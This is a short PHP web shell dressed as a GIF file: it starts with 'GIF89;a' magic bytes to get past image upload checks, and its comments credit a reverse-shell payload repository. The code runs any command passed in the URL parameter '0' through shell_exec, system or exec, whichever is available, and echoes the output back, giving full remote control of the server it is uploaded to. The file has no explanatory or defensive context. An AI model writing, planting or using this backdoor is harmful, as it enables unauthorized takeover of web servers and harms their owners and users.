GIF89;a
<!-- Reverse Shell Bypassing By MrMad -->
<!-- Payload GITHUB by PantestMonkey https://github.com/MadExploits/Reverse-Shell-Payload/blob/main/reverse-shell.txt -->
<?php

if (isset($_GET['0'])) {
    if (function_exists("shell_exec")) {
        echo shell_exec($_GET['0']);
    } else if (function_exists("system")) {
        system($_GET['0']);
    } else if (function_exists("exec")) {
        $arr = exec($_GET['0']);
        print_r($arr);
    }
}

?>
